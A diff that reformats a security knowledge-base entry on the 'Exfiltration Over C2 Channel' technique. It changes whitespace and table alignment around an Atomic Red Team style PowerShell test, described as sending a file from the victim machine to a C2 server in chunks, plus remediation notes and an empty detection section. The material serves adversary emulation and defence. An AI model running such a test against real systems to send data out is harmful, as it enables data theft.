@@ -30,10 +30,8 @@ tech_stack:
   - windows
 cwe_ids:
   - CWE-200
-chains_with:
-  []
-prerequisites:
-  []
+chains_with: []
+prerequisites: []
 severity_boost: {}
 ---
 
@@ -71,7 +69,7 @@ Exfiltrates a file present on the victim machine to the C2 server.
 **Supported Platforms:** windows
 
 ```powershell
-if(-not (Test-Path #{filepath})){ 
+if(-not (Test-Path #{filepath})){
   1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value "This is line $_." }
 }
 [System.Net.ServicePointManager]::Expect100Continue = $false
@@ -101,7 +99,6 @@ foreach ($chunk in $chunks) {
 }
 ```
 
-
 ### Manual Testing
 
 If Atomic Red Team tests are not applicable, manually verify the technique by:
@@ -115,29 +112,28 @@ If Atomic Red Team tests are not applicable, manually verify the technique by:
 ## Remediation Guide
 
 ### M1031 Network Intrusion Prevention
+
 Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.
 
 ### M1057 Data Loss Prevention
-Data loss prevention can detect and block sensitive data being sent over unencrypted protocols.
 
+Data loss prevention can detect and block sensitive data being sent over unencrypted protocols.
 
 ## Detection
 
 ### Detection Strategy for Exfiltration Over C2 Channel
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| Exfiltration Over C2 Channel technique applicable | Low | Exfiltration |
+| Finding                                           | Severity | Impact       |
+| ------------------------------------------------- | -------- | ------------ |
+| Exfiltration Over C2 Channel technique applicable | Low      | Exfiltration |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                             |
+| ------- | --------------------------------- |
 | CWE-200 | Exposure of Sensitive Information |
-
 
 ## References
 
